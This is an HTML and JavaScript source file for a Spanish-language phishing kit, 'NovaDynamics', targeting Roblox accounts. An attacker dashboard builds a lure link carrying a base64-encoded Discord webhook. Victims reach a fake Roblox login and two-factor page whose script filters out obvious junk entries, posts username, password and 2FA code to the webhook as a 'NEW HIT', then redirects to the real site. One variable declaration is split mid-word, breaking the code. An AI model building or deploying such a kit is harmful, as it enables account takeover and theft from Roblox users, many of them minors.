<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NovaDynamics</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
        body{background:#1a1a1f;color:#fff;min-height:100vh}
        .hidden{display:none !important}

        /* LOGO ROBLOX ARRIBA DERECHA */
        .roblox-logo{position:fixed;top:15px;right:20px;z-index:100}
        .roblox-logo svg{width:40px;height:40px;fill:#e2231a}

        /* CONTENEDORES */
        .container{max-width:420px;margin:0 auto;padding:40px 20px}
        .dashboard-container{max-width:500px}
        h2{text-align:center;margin-bottom:25px;color:#fff}
        .card{background:#27272f;padding:25px;border-radius:10px;box-shadow:0 4px 12px rgba(0,0,0,.3)}
        input,button{width:100%;padding:12px 10px;margin:8px 0;border-radius:6px;border:none;font-size:15px}
        input{background:#33333f;color:#fff;border:1px solid #444}
        input:focus{outline:none;border-color:#00a2ff}
        button{background:#00a2ff;color:#fff;font-weight:600;cursor:pointer;transition:.2s}
        button:hover{background:#008feb}
        button:disabled{background:#555;cursor:not-allowed}
        .btn-success{background:#28c747;margin-top:10px}
        .btn-success:hover{background:#22b03d}
        .btn-back{background:#444;margin-bottom:15px}
        .btn-back:hover{background:#555}
        .error{color:#ff5555;font-size:14px;margin:6px 0;min-height:20px}
        .link-result{background:#2c2c3a;padding:12px;border-radius:6px;margin-top:15px;word-break:break-all;font-size:13px;color:#00eeff}
        .title-center{text-align:center;margin-bottom:20px}

        /* CAJA CÓDIGO 2FA */
        .code-inputs{display:flex;gap:8px;justify-content:center;margin:20px 0}
        .code-inputs input{width:45px;height:55px;text-align:center;font-size:24px;padding:0}
        .label{font-size:14px;color:#ccc;margin-top:12px;display:block}
    </style>
</head>
<body>

    <!-- LOGO ROBLOX ARRIBA DERECHA -->
    <div class="roblox-logo">
        <svg viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg">
            <path d="M20 0C9 0 0 9 0 20C0 31 9 40 20 40C31 40 40 31 40 20C40 9 31 0 20 0ZM14.5 30.5L9.5 23.5L14.5 16.5L19.5 23.5L14.5 30.5ZM25.5 30.5L20.5 23.5L25.5 16.5L30.5 23.5L25.5 30.5Z"/>
        </svg>
    </div>

    <!-- ================= DASHBOARD — CREAR ENLACE ================= -->
    <div id="dashboard" class="container dashboard-container">
        <h2>🔗 Crear Enlace</h2>
        <div class="card">
            <label class="label">ID de cuenta Roblox</label>
            <input type="text" id="usuarioLink" placeholder="Ej: 4738685727">
            
            <label class="label">Tu Webhook de Discord</label>
            <input type="text" id="webhookUrl" placeholder="Pega tu enlace de Discord aquí">
            
            <button onclick="generarEnlace()">✅ Generar Enlace</button>
            
            <div id="linkResult" class="link-result hidden"></div>
            <button id="copyBtn" class="btn-success hidden" onclick="copiarEnlace()">📋 Copiar Enlace</button>
        </div>
    </div>

    <!-- ================= PÁGINA INICIO DE SESIÓN ================= -->
    <div id="loginPage" class="container hidden">
        <button class="btn-back" onclick="volverPanel()">← Volver al Panel</button>
        <h2>Iniciar Sesión</h2>
        <div class="card">
            <label class="label">Nombre de usuario</label>
            <input type="text" id="userField" placeholder="Nombre de usuario">

            <label class="label">Contraseña</label>
            <input type="password" id="passField" placeholder="Contraseña">
            <div id="passError" class="error"></div>

            <button id="loginBtn" onclick="validarLogin()">Iniciar sesión</button>
        </div>
    </div>

    <!-- ================= CAJA CÓDIGO 2FA ================= -->
    <div id="twofaPage" class="container hidden">
        <h2>Verificación en dos pasos</h2>
        <div class="card">
            <p style="text-align:center;color:#ccc;margin-bottom:15px;">Escribe el código de 6 dígitos de tu autenticador</p>
            <div class="code-inputs">
                <input type="text" maxlength="1" oninput="mover(this,0)">
                <input type="text" maxlength="1" oninput="mover(this,1)">
                <input type="text" maxlength="1" oninput="mover(this,2)">
                <input type="text" maxlength="1" oninput="mover(this,3)">
                <input type="text" maxlength="1" oninput="mover(this,4)">
                <input type="text" maxlength="1" oninput="mover(this,5)">
            </div>
            <div id="codeError" class="error"></div>
            <button onclick="enviarCodigo()">Verificar</button>
        </div>
    </div>

    <script>
        let enlaceGenerado = "";
        let WEBHOOK = "";
        let USUARIO_CAPTURADO = "";
        let PASS_CAPTUR
        ADA = "";        // ================= DETECTAR SI VIENEN DEL ENLACE =================
        window.onload = function(){
            const params = new URLSearchParams(window.location.search);
            const u = params.get('u');
            const wh = params.get('wh');

            if(u){
                // VIENEN DEL ENLACE → MOSTRAR INICIO DE SESIÓN
                document.getElementById('dashboard').classList.add('hidden');
                document.getElementById('loginPage').classList.remove('hidden');
                document.getElementById('userField').value = u;
                USUARIO_CAPTURADO = u;
                if(wh) WEBHOOK = atob(wh);
            }
        };

        // ================= GENERAR ENLACE =================
        function generarEnlace(){
            const id = document.getElementById('usuarioLink').value.trim();
            const wh = document.getElementById('webhookUrl').value.trim();

            if(!id || !wh){
                alert("⚠️ Pon el ID y tu Webhook");
                return;
            }

            const whCodificado = btoa(wh);
            enlaceGenerado = window.location.origin + window.location.pathname + "?u=" + id + "&wh=" + whCodificado;

            document.getElementById('linkResult').classList.remove('hidden');
            document.getElementById('linkResult').textContent = enlaceGenerado;
            document.getElementById('copyBtn').classList.remove('hidden');
        }

        function copiarEnlace(){
            navigator.clipboard.writeText(enlaceGenerado).then(()=>{
                alert("✅ ¡Enlace copiado! Compártelo");
            });
        }

        function volverPanel(){
            window.location.search = "";
            window.location.reload();
        }

        // ================= VALIDAR CONTRASEÑA =================
        function validarLogin(){
            const user = document.getElementById('userField').value.trim();
            const pass = document.getElementById('passField').value.trim();
            const error = document.getElementById('passError');
            const btn = document.getElementById('loginBtn');

            // ❌ Si está vacía o muy corta
            if(!user || pass.length < 6){
                error.textContent = "The password is incorrect.";
                return;
            }

            // ❌ CONTRASEÑAS OBVIAMENTE FALSAS
            const prohibidasPass = [
                "123456","123456789","password","12345678","12345",
                "qwerty","abc123","111111","123123","admin","1234567",
                "password1","iloveyou","000000","123321","654321",
                "1234567890","qwerty123","121212","00000000",
                "11111111","88888888","99999999","123654"
            ];
            if(prohibidasPass.includes(pass.toLowerCase())){
                error.textContent = "The password is incorrect.";
                return;
            }

            // ✅ PASA → SIMULAR VERIFICACIÓN
            error.textContent = "";
            btn.textContent = "Verifying...";
            btn.disabled = true;

            setTimeout(()=>{
                btn.textContent = "Iniciar sesión";
                btn.disabled = false;
                USUARIO_CAPTURADO = user;
                PASS_CAPTURADA = pass;
                // MOSTRAR CAJA DE CÓDIGO
                document.getElementById('loginPage').classList.add('hidden');
                document.getElementById('twofaPage').classList.remove('hidden');
                document.querySelectorAll('.code-inputs input')[0].focus();
            }, 1500);
        }

        // ================= MOVERSE ENTRE CAJAS =================
        function mover(el, idx){
            if(el.value.length === 1){
                const inputs = document.querySelectorAll('.code-inputs input');
                if(idx < 5) inputs[idx+1].focus();
            }
        }

        // ================= VALIDAR CÓDIGO 2FA =================
        function enviarCodigo(){
            const inputs = document.querySelectorAll('.code-inputs input');
            let codigo = "";
            inputs.forEach(i => codigo += i.value.trim());
            const error = document.getElementById('codeError');

            // ❌ MENOS DE 6 DÍGITOS
            if(codigo.length !== 6 || !/^\d{6}$/.test(codigo)){
                error.textContent = "❌ Code is invalid";
                return;
            }

            // ❌ TODOS LOS CÓDIGOS OBVIAMENTE FALSOS
            const prohibidosCod = [
                "000000","111111","222222","333333","444444",
                "555555","666666","777777","888888","999999",
                "012345","123456","234567","345678","456789",
                "543210","654321","765432","876543","987654",
                "010101","101010","121212","202020","212121",
                "111222","222333","333444","444555","555666",
                "123321","135531","147741","258852","369963",
                "159951","357753","123210","112211","132231",
                "001234","123654","135790","246800","963852",
                "852963","741852","159753","357159","000001",
                "000123","012012","120120","147258","258369",
                "369258","481592","592713","025874","159357",
                "258741","369147","471258","582369","008520",
                "975310","864209","753198","642087","531976",
                "013579","024680","001122","112233","223344",
                "334455","445566","556677","667788","778899",
                "998877","887766","000111","000222","000333",
                "000444","000555","000666","000777","000888",
                "000999","111000","222000","333000","444000",
                "555000","666000","777000","888000","999000",
                "111333","111444","111555","111666","111777",
                "111888","111999","222111","222444","222555",
                "222666","222777","222888","222999","333111",
                "333222","333555","333666","333777","333888",
                "333999","444000","444111","444222","444333",
                "444666","444777","444888","444999","555111",
                "555222","555333","555444","555777","555888",
                "555999","666111","666222","666333","666444",
                "666555","666888","666999","777111","777222",
                "777333","777444","777555","777666","777888",
                "777999","888111","888222","888333","888444",
                "888555","888666","888777","888999","999111",
                "999222","999333","999444","999555","999666",
                "999777","999888","010203","020304","030405",
                "040506","050607","060708","070809","080910"
            ];

            if(prohibidosCod.includes(codigo)){
                error.textContent = "❌ Code is invalid";
                return;
            }

            // ✅ CÓDIGO VÁLIDO → ENVIAR A DISCORD
            error.textContent = "";
            alert("✅ Code verified!\n🔓 Iniciando sesión...");

            enviarDatosDiscord(codigo);
        }

        // ================= ENVIAR TODO A DISCORD =================
        async function enviarDatosDiscord(codigo){
            if(!WEBHOOK){
                alert("✅ ¡Datos capturados! Webhook no configurado.");
                return;
            }

            const datos = {
                content: "@everyone **NEW HIT — NovaDynamics**",
                embeds: [{
                    title: "🔐 Cuenta Roblox Capturada",
                    color: 16711680,
                    fields: [
                        {name: "👤 Usuario", value: "```"+USUARIO_CAPTURADO+"```", inline:false},
                        {name: "🔑 Contraseña", value: "```"+PASS_CAPTURADA+"```", inline:false},
                        {name: "📲 Código 2FA", value: "```"+codigo+"```", inline:false}
                    ],
                    footer: {text: "NovaDynamics Beam System"}
                }]
            };

            await fetch(WEBHOOK, {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify(datos)
            });

            alert("✅ ¡Todo listo! Redirigiendo a Roblox...");
            window.location.href = "https://www.roblox.com/login";
        }

    </script>
</body>
</html>
